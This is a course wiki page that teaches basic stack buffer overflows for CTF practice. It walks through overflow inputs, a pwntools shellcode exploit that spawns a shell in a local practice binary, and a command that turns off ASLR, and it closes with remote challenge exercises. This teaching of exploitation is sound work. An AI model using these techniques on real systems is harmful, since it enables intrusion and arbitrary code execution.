            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Forensics/MacroHard%20WeakEdge/" class="md-nav__link">
        MacroHard WeakEdge
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Forensics/Milkslap/" class="md-nav__link">
        Milkslap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Forensics/Wireshark%20doo%20dooo%20do%20doo/" class="md-nav__link">
        Wireshark doo dooo do doo...
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_6" type="checkbox" id="__nav_8_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_6">
          General Skills
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="General Skills" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_6">
          <span class="md-nav__icon md-icon"></span>
          General Skills
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/2Warm/" class="md-nav__link">
        2Warm
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/ChieftainsSecret/" class="md-nav__link">
        ChieftainsSecret
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/Lets%20Warm%20Up/" class="md-nav__link">
        Lets Warm Up
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/shuffle_code/" class="md-nav__link">
        shuffle_code
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/xixixi/" class="md-nav__link">
        xixixi
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/%E5%88%B0%E7%82%B9%E4%BA%86/" class="md-nav__link">
        到点了
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/%E5%B1%82%E5%B1%82%E5%8F%96%E8%AF%81/" class="md-nav__link">
        层层取证
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/%E5%B8%A6%E9%9F%B3%E4%B9%90%E5%AE%B6/" class="md-nav__link">
        带音乐家
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/%E8%80%83%E5%8F%A4/" class="md-nav__link">
        考古
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/%E8%BF%9B%E5%88%B6%E5%8F%8D%E8%BD%AC/" class="md-nav__link">
        进制反转
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/General%20Skills/%E9%B8%A3%E9%9B%8F%E6%81%8B/" class="md-nav__link">
        鸣雏恋
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_7" type="checkbox" id="__nav_8_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_7">
          Reverse Engineering
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_7">
          <span class="md-nav__icon md-icon"></span>
          Reverse Engineering
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/apk1/" class="md-nav__link">
        apk1
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/bread-making/" class="md-nav__link">
        bread-making
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/dimensionality/" class="md-nav__link">
        dimensionality
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/re1/" class="md-nav__link">
        re1
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/Shop/" class="md-nav__link">
        Shop
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/speeds%20and%20feeds/" class="md-nav__link">
        speeds and feeds
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Reverse%20Engineering/wstrings/" class="md-nav__link">
        wstrings
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_8" type="checkbox" id="__nav_8_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_8">
          Web Exploitation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Web Exploitation" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_8">
          <span class="md-nav__icon md-icon"></span>
          Web Exploitation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Web%20Exploitation/Cookies/" class="md-nav__link">
        Cookies
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Web%20Exploitation/inspect-me/" class="md-nav__link">
        inspect-me
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Web%20Exploitation/It%20is%20my%20Birthday/" class="md-nav__link">
        It is my Birthday
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Web%20Exploitation/Most%20Cookies/" class="md-nav__link">
        Most Cookies
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Web%20Exploitation/Scavenger%20Hunt/" class="md-nav__link">
        Scavenger Hunt
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#binary-exploitation" class="md-nav__link">
    Binary Exploitation
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#buffers" class="md-nav__link">
    Buffers
  </a>
  
    <nav class="md-nav" aria-label="Buffers">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploits" class="md-nav__link">
    Exploits
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction-to-stack" class="md-nav__link">
    Introduction to Stack
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#buffer-overflow" class="md-nav__link">
    Buffer Overflow
  </a>
  
    <nav class="md-nav" aria-label="Buffer Overflow">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#stack-buffer-overflow" class="md-nav__link">
    Stack buffer overflow
  </a>
  
    <nav class="md-nav" aria-label="Stack buffer overflow">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#passing-an-impossible-check" class="md-nav__link">
    Passing an impossible check
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#going-one-step-further" class="md-nav__link">
    Going one step further
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overwrite-values-on-stack" class="md-nav__link">
    Overwrite values on stack
  </a>
  
    <nav class="md-nav" aria-label="Overwrite values on stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#breakdown" class="md-nav__link">
    Breakdown
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    Solution
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shellcode" class="md-nav__link">
    Shellcode
  </a>
  
    <nav class="md-nav" aria-label="Shellcode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#disabling-aslr" class="md-nav__link">
    Disabling ASLR
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-the-buffer-in-memory" class="md-nav__link">
    Finding the Buffer in Memory
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-the-padding" class="md-nav__link">
    Finding the Padding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#putting-it-all-together" class="md-nav__link">
    Putting it all together
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#final-exploit" class="md-nav__link">
    Final Exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#find-shellcode-online" class="md-nav__link">
    Find Shellcode Online
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exercise" class="md-nav__link">
    Exercise
  </a>
  
    <nav class="md-nav" aria-label="Exercise">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#5-pt-smash-the-stack" class="md-nav__link">
    (5 pt) Smash the stack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-pt-check-and-overlap" class="md-nav__link">
    (5 pt) Check and overlap
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bonus-5-pt-perfectly-secure-from-shellcode" class="md-nav__link">
    (BONUS 5 pt) Perfectly secure from shellcode
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                
<a href="https://github.com/lyther/wiki/edit/master/docs/CS315/Week 2.md" title="Edit this page" class="md-content__button md-icon">
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
</a>



<h1 id="week-2-pwn-basic-buffer-overflow">Week 2 PWN: Basic Buffer Overflow</h1>
<h2 id="binary-exploitation">Binary Exploitation</h2>
<p>Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.</p>
<p>Common topics addressed by Binary Exploitation or 'pwn' challenges include:</p>
<ul>
<li>Registers</li>
<li><strong>The Stack</strong></li>
<li>Calling Conventions</li>
<li>Global Offset Table (GOT)</li>
<li><strong>Buffers</strong></li>
<li><strong>Buffer Overflow</strong></li>
<li>Return Oriented Programming (ROP)</li>
<li>Binary Security</li>
<li>No eXecute (NX)</li>
<li>Address Space Layout Randomization (ASLR)</li>
<li>Stack Canaries</li>
<li>Relocation Read-Only (RELRO)</li>
<li>The Heap</li>
<li>Heap Exploitation</li>
<li>Format String Vulnerability</li>
</ul>
<h2 id="buffers">Buffers</h2>
<p>A buffer is any allocated space in memory where data (often user input) can be stored. For example, in the following C program <code>name</code> would be considered a stack buffer:</p>
<pre><code>#include &lt;stdio.h&gt;

int main() {
    char name[64] = {0};
    read(0, name, 63);
    printf(&quot;Hello %s&quot;, name);
    return 0;
}
</code></pre>
<p>Buffers could also be global variables:</p>
<pre><code>#include &lt;stdio.h&gt;

char name[64] = {0};

int main() {
    read(0, name, 63);
    printf(&quot;Hello %s&quot;, name);
    return 0;
}
</code></pre>
<p>Or dynamically allocated on the heap:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    char *name = malloc(64);
    memset(name, 0, 64);
    read(0, name, 63);
    printf(&quot;Hello %s&quot;, name);
    return 0;
}
</code></pre>
<h3 id="exploits">Exploits</h3>
<p>Given that buffers commonly hold user input, mistakes when writing to them could result in attacker controlled data being written outside of the buffer's space.</p>
<h2 id="introduction-to-stack">Introduction to Stack</h2>
<p>A stack is an abstract data type frequently used in computer science. It has a property that the Last item placed will be the first to be removed from it ( LIFO ) . Several options are defined on the stack , the most important ones are <code>push</code> and <code>pop</code> . <code>push</code> add an element to the top of the stack , and <code>pop</code> removes elements from the top .</p>
<pre><code>    /* The address of memory which is pointed by the Stack Pointer ( sp ) is the top of the stack */

    ┌──────────────┐ &lt;─ sp
    └──────────────┘

    : push 0x10                               /* sp is incremented and the value is stored at that address */
    ┌──────────────┐ 
    │     0x10     │
    └──────────────┘ &lt;─ sp

    : push 0x20

    ┌──────────────┐
    │    0x10      │
    ├──────────────┤
    │    0x20      │
    └──────────────┘ &lt;─ sp

    : pop var                                 /* The value pointed by the sp is removed from the stack and sp is decremented */

    ┌──────────────┐ 
    │     0x10     │
    └──────────────┘ &lt;─ sp
</code></pre>
<p>Modern computers are designed with the need of high-level languages in mind. The most important technique for structuring programs introduced by high-level languages is the function. From one point of view, a function call alters the flow of control just as a jump does, but unlike a jump, when finished performing its task, a function returns control to the statement or instruction following the call. This high-level abstraction is implemented with the help of the stack.</p>
<p>The stack is also used to allocate local variables , to pass parameters to the functions, and to store the information needed to return to caller function after the execution of the function gets over.</p>
<p>The stack pointer is a special register which will always point to the top of the stack , in x86-32 bit this register is called <code>esp</code> .The area allocated on the stack for a function is called it's stack frame . and the registers <code>ebp</code> and <code>esp</code> (in x86-32 bit system )are used to specify the boundaries of the stack frame . The <code>ebp</code> will point to the staring of the stack frame of the current function and the <code>esp</code> register will point to the bottom.</p>
<h2 id="buffer-overflow">Buffer Overflow</h2>
<p>A Buffer Overflow is a vulnerability in which data can be written which exceeds the allocated space, allowing an attacker to overwrite other data.</p>
<h3 id="stack-buffer-overflow">Stack buffer overflow</h3>
<p>The simplest and most common buffer overflow is one where the buffer is on the stack. Let's look at an example.</p>
<pre><code>#include &lt;stdio.h&gt;

int main() {
    int secret = 0xdeadbeef;
    char name[100] = {0};
    read(0, name, 0x100);
    if (secret == 0x1337) {
        puts(&quot;Wow! Here's a secret.&quot;);
    } else {
        puts(&quot;I guess you're not cool enough to see my secret&quot;);
    }
}
</code></pre>
<p>There's a tiny mistake in this program which will allow us to see the secret. <code>name</code> is decimal 100 bytes, however we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage.</p>
<p>If the compiler chose to layout the stack like this:</p>
<pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0xdeadbeef  // secret
...
        0xffff0004: 0x0
ESP -&gt;  0xffff0000: 0x0         // name
</code></pre>
<p>let's look at what happens when we read in 0x100 bytes of 'A's.</p>
<p>The first decimal 100 bytes are saved properly:</p>
<pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0xdeadbeef  // secret
...
        0xffff0004: 0x41414141
ESP -&gt;  0xffff0000: 0x41414141  // name
</code></pre>
<p>However when the 101st byte is read in, we see an issue:</p>
<pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0xdeadbe41  // secret
...
        0xffff0004: 0x41414141
ESP -&gt;  0xffff0000: 0x41414141  // name
</code></pre>
<p>The least significant byte of <code>secret</code> has been overwritten! If we follow the next 3 bytes to be read in, we'll see the entirety of <code>secret</code> is "clobbered" with our 'A's</p>
<pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP
        0xffff0068: 0xffff0100  // Saved EBP
        0xffff0064: 0x41414141  // secret
...
        0xffff0004: 0x41414141
ESP -&gt;  0xffff0000: 0x41414141  // name
</code></pre>
<p>The remaining 152 bytes would continue clobbering values up the stack.</p>
<h4 id="passing-an-impossible-check">Passing an impossible check</h4>
<p>How can we use this to pass the seemingly impossible check in the original program? Well, if we carefully line up our input so that the bytes that overwrite <code>secret</code> happen to be the bytes that represent 0x1337 in little-endian, we'll see the secret message.</p>
<p>A small Python one-liner will work nicely: <code>python -c "print 'A'*100 + '\x31\x13\x00\x00'"</code></p>
<p>This will fill the <code>name</code> buffer with 100 'A's, then overwrite <code>secret</code> with the 32-bit little-endian encoding of 0x1337.</p>
<h4 id="going-one-step-further">Going one step further</h4>
<p>As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as "Saved EIP" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after <code>main</code> finishes running, giving us the ability to control what the program does entirely.</p>
<p>Usually, the end objective in binary exploitation is to get a shell (often called "popping a shell") on the remote computer. The shell provides us with an easy way to run <em>anything</em> we want on the target computer.</p>
<p>Say there happens to be a nice function that does this defined somewhere else in the program that we normally can't get to:</p>
<pre><code>void give_shell() {
    system(&quot;/bin/sh&quot;);
}
</code></pre>
<p>Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where <code>give_shell</code> is. Then, when main returns, it will pop that address off of the stack and jump to it, running <code>give_shell</code>, and giving us our shell.</p>
<p>Assuming <code>give_shell</code> is at 0x08048fd0, we could use something like this: <code>python -c "print 'A'*108 + '\xd0\x8f\x04\x08'"</code></p>
<p>We send 108 'A's to overwrite the 100 bytes that is allocated for <code>name</code>, the 4 bytes for <code>secret</code>, and the 4 bytes for the saved EBP. Then we simply send the little-endian form of <code>give_shell</code>'s address, and we would get a shell!</p>
<p>This idea is extended on in Return Oriented Programming.</p>
<h3 id="overwrite-values-on-stack">Overwrite values on stack</h3>
<p>For example, we are given the following code in C language:</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 if(argc == 1) {
  errx(1, &quot;please specify an argument\n&quot;);
 }

 modified = 0;
 strcpy(buffer, argv[1]);

 if(modified == 0x61626364) {
  printf(&quot;you have correctly got the variable to the right value\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }
}
</code></pre>
<h4 id="breakdown">Breakdown</h4>
<p>So this code :</p>
<p>creates a variable called “modified” and assigns a buffer of 64 chars to it.</p>
<pre><code>volatile int modified; 
char buffer[64];
</code></pre>
<p>Checks if we supplied an argument or not.</p>
<pre><code>if(argc == 1) {
 errx(1, &quot;please specify an argument\n&quot;);
}
</code></pre>
<p>Sets the value of the “modified” variable into 0 , then it copies whatever we give it <code>argv[1]</code> into the buffer of “modified”.</p>
<pre><code>modified = 0;
strcpy(buffer, argv[1]);
</code></pre>
<p>Then it checks if the variable’s value is <code>0x61626364</code> or not</p>
<pre><code>if(modified == 0x61626364) {
  printf(&quot;you have correctly got the variable to the right value\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }
</code></pre>
<h4 id="solution">Solution</h4>
<p>So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is <code>0x61626364</code> in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it.</p>
<p>Let’s execute stack1</p>
<p><img alt="img" src="https://0xrick.github.io/images/binary-exploitation/BOF2/1.png" /></p>
<p>We get please specify an argument so let’s enter anything.</p>
<p><img alt="img" src="https://0xrick.github.io/images/binary-exploitation/BOF2/2.png" /></p>
<p><img alt="img" src="https://0xrick.github.io/images/binary-exploitation/BOF2/3.png" /></p>
<p>We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b”</p>
<pre><code>./stack1 `python -c &quot;print ('A' * 64 + 'b')&quot;`
</code></pre>
<p><img alt="img" src="https://0xrick.github.io/images/binary-exploitation/BOF2/4.png" /></p>
<p>And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that.</p>
<pre><code>./stack1 `python -c &quot;print ('A' * 64 + 'dcba')&quot;`
</code></pre>
<p><img alt="img" src="https://0xrick.github.io/images/binary-exploitation/BOF2/5.png" /></p>
<p>And we did it !</p>
<p>But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them.</p>
<pre><code>./stack1 `python -c &quot;print('A' * 64 + '\x64\x63\x62\x61')&quot;`
</code></pre>
<p><img alt="img" src="https://0xrick.github.io/images/binary-exploitation/BOF2/6.png" /></p>
<h2 id="shellcode">Shellcode</h2>
<p>In real exploits, it's not particularly likely that you will have a <code>win()</code> function lying around - shellcode is a way to run your <strong>own</strong> instructions, giving you the ability to run arbitrary commands on the system.</p>
<p><strong>Shellcode</strong> is essentially <strong>assembly instructions</strong>, except we input them into the binary; once we input it, we overwrite the return pointer to hijack code execution and point at our own instructions!</p>
<p>I promise you can trust me but you should never <em>ever</em> run shellcode without knowing what it does. Pwntools is safe and has almost all the shellcode you will ever need.</p>
<p>The reason shellcode is successful is that <a href="https://en.wikipedia.org/wiki/Von_Neumann_architecture">Von Neumann architecture</a> (the architecture used in most computers today) does not differentiate between <strong>data</strong> and <strong>instructions</strong> - it doesn't matter where or what you tell it to run, it will attempt to run it.  Therefore, even though our input is data, the computer <em>doesn't know that</em> - and we can use that to our advantage.</p>
<p><a href="https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-MEwBGnjPgf263kl5vWP%2F-MExsCT3Quk1cysuiZzS%2F-MExsSPp2uWydaCUW9Dh%2Fshellcode.zip?alt=media&amp;token=8f373517-663b-4439-a179-73d6f97726c0">Shellcodeshellcode.zip - 3KB</a></p>
<h3 id="disabling-aslr">Disabling ASLR</h3>
<p>ASLR is a security technique, and while it is not specifically designed to combat shellcode, it involves randomising certain aspects of memory (we will talk about it in much more detail later). This randomisation can make shellcode exploits like the one we're about to do more less reliable, so we'll be disabling it for now <a href="https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization">using this</a>.</p>
<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>Again, you should never run commands if you don't know what they do</p>
<h3 id="finding-the-buffer-in-memory">Finding the Buffer in Memory</h3>
<p>Let's debug <code>vuln()</code> using <code>radare2</code> and work out where in memory the buffer starts; this is where we want to point the return pointer to.</p>
<pre><code>$ r2 -d -A vuln
[0xf7fd40b0]&gt; s sym.unsafe ; pdf[...]; var int32_t var_134h @ ebp-0x134[...]
</code></pre>
<p>This value that gets printed out is a <strong>local variable</strong> - due to its size, it's fairly likely to be the buffer. Let's set a breakpoint just after <code>gets()</code> and find the exact address.</p>
<pre><code>[0x08049172]&gt; dcOverflow me&lt;&lt;Found me&gt;&gt;                    &lt;== This was my inputhit breakpoint at: 80491a8[0x080491a8]&gt; px @ ebp - 0x134- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF0xffffcfb4  3c3c 466f 756e 6420 6d65 3e3e 00d1 fcf7  &lt;&lt;Found me&gt;&gt;....
[...]
</code></pre>
<p>It appears to be at <code>0xffffcfd4</code>; if we run the binary multiple times, it should remain where it is (if it doesn't, make sure ASLR is disabled!).</p>
<h3 id="finding-the-padding">Finding the Padding</h3>
<p>Now we need to calculate the padding until the return pointer. We'll use the De Bruijn sequence as explained in the previous blog post.</p>
<pre><code>$ ragg2 -P 400 -r&lt;copy this&gt;
$ r2 -d -A vuln[0xf7fd40b0]&gt; dcOverflow me&lt;&lt;paste here&gt;&gt;[0x73424172]&gt; wopO `dr eip`312
</code></pre>
<p>The padding is 312 bytes.</p>
<h3 id="putting-it-all-together">Putting it all together</h3>
<p>In order for the shellcode to be correct, we're going to set <code>context.binary</code> to our binary; this grabs stuff like the arch, OS and bits and enables pwntools to provide us with working shellcode.</p>
<pre><code>from pwn import *
context.binary = ELF('./vuln')
p = process()
</code></pre>
<p>We can use just <code>process()</code> because once <code>context.binary</code> is set it is assumed to use that process</p>
<p>Now we can use pwntools' awesome shellcode functionality to make it <em>incredibly</em> simple.</p>
<pre><code>payload = asm(shellcraft.sh())          # The shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Address of the Shellcode
</code></pre>
<p>Yup, that's it. Now let's send it off and use <code>p.interactive()</code>, which enables us to communicate to the shell.</p>
<pre><code>log.info(p.clean())
p.sendline(payload)
p.interactive()
</code></pre>
<p>If you're getting an <code>EOFError</code>, print out the shellcode and try to find it in memory - the stack address may be wrong</p>
<pre><code>$ python3 exploit.py
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process 'vuln': pid 3606
[*] Overflow me
[*] Switching to interactive mode
$ whoami
ironstone
$ ls
exploit.py  source.c  vuln
</code></pre>
<p>And it works! Awesome.</p>
<h3 id="final-exploit">Final Exploit</h3>
<pre><code>from pwn import *
context.binary = ELF('./vuln')
p = process()
payload = asm(shellcraft.sh())
# The shellcodepayload = payload.ljust(312, b'A')
# Paddingpayload += p32(0xffffcfb4)
# Address of the Shellcode
log.info(p.clean())
p.sendline(payload)
p.interactive()
</code></pre>
<h2 id="find-shellcode-online">Find Shellcode Online</h2>
<p>There are some online resources for shellcode. Sometimes the program runs input check that some characters are filtered. Using online database or pwntool's shellcode generator are both fine.</p>
<p>Shellcode database: <a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p>
<p>According to the different CPU architecture and operating system, you may need different shellcode.</p>
<h2 id="exercise">Exercise</h2>
<h3 id="5-pt-smash-the-stack">(5 pt) Smash the stack</h3>
<p>After three days of staying up to finish deadline, you feel extremely tired. Wanna to buy some coffee, you step out room and walking to the store. Tired, exhausted, and thinking about the difficult challenge, without seeing the truck that rushing directly to you...</p>
<p>When light appears, a goddess whos so beautiful standing in front of you, said, "Now, you are selected to re-born in the fantasy world."</p>
<p>"Help us to fight dragon the world destroyer, and save this world plz!" Said the goddess. "You have <strong>ONE</strong> chance to make a vow, and I'll make it true."</p>
<p>"By the way, if you put something that I can't handle, I'll give you a <code>flag</code>!"</p>
<p><code>nc ali.infury.org 10001</code></p>
<p><a href="https://wiki.compass.college/CS315/file/chall2-1">goddess</a></p>
<p><a href="../file/chall2-1.c">goddess.c</a></p>
<p>Hack the goddess and find flag. Flag format: <code>flag{***}</code></p>
<h3 id="5-pt-check-and-overlap">(5 pt) Check and overlap</h3>
<p>Because of the goddess got stuck when processing, so you finally didn't get any special power. After fighting for days, you reach the "end castle" and ready to terminate "dragon the destroyer" by yourself.</p>
<p>"You, a mere human. How dare you to challenge me!" Said the dragon, who has indestructible scale and powerful skin that resists to all magic.</p>
<p>"Only using the ancient legendary weapons that you can hurt me. However, those powers are <strong>unreachable</strong> and you <strong>can't assign value to them</strong>."</p>
<p>"Now, what's your last word?"</p>
<p><code>nc ali.infury.org 10002</code></p>
<p><a href="https://wiki.compass.college/CS315/file/chall2-2">dragon</a></p>
<p><a href="../file/chall2-2.c">dragon.c</a></p>
<p>Fight the dragon and find flag. Flag format: <code>flag{***}</code></p>
<h3 id="bonus-5-pt-perfectly-secure-from-shellcode">(BONUS 5 pt) Perfectly secure from shellcode</h3>
<p>The dragon fell down into dust. You become the hero of the fantasy world. However, you still want to return home.</p>
<p>"Only the God can leave this world." Said the wiser, "that dragon is the most powerful creature and the most close to the God. Maybe... Only maybe... There is only one way."</p>
<p>"Grab the dragon's egg, use it to caste the most powerful wish magic. You have a chance to say something to the world tree."</p>
<p>"However, you may only use characters <strong>no smaller than 32, no larger than 126</strong> in ASCII order. May the bless be with you!"</p>
<p>The end of journey is arriving.</p>
<p>You are filled with determination.</p>
<p><code>nc ali.infury.org 10003</code></p>
<p><a href="https://wiki.compass.college/CS315/file/chall2-3">world</a></p>
<p><a href="../file/chall2-3.c">world.c</a></p>
<p>Become the God and find the flag. Flag format: <code>flag{***}</code></p>

              
            </article>
          </div>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../Week%201/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Week 1 CTF Introduction and Forensics" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Week 1 CTF Introduction and Forensics
            </div>
          </div>
        </a>
      
      
        
        <a href="../Week%203/" class="md-footer__link md-footer__link--next" aria-label="Next: Week3 PWN: Advanced Buffer Overflow" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Week3 PWN: Advanced Buffer Overflow
            </div>
          </div>
          <div class="md-footer__button md-icon">
